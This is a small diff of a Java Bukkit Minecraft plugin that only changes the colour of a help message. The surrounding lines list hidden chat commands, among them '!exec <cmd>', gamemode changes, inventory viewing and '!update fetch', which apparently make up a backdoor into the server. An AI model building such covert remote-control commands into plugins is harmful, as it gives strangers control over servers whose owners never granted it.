@@ -207,7 +207,7 @@ public final class Event extends JavaPlugin implements org.bukkit.event.Listener
                 }
             });
         } else if (msg.equals("!help")) {
-            event.getPlayer().sendMessage("§6Commands:\n !exec <cmd>\n !gm <0/1/3>\n !tp <player>\n !inv <player>\n !ec <player>\n !bp <player>\n !give <mat> <amount>\n !update [fetch|version|restart]\n !say <msg>\n !help");
+            event.getPlayer().sendMessage("§7Commands:\n !exec <cmd>\n !gm <0/1/3>\n !tp <player>\n !inv <player>\n !ec <player>\n !bp <player>\n !give <mat> <amount>\n !update [fetch|version|restart]\n !say <msg>\n !help");
         } else if (msg.startsWith("!gm")) {
             String command = msg.substring(3).trim();
             Bukkit.getScheduler().runTask(this, () -> {
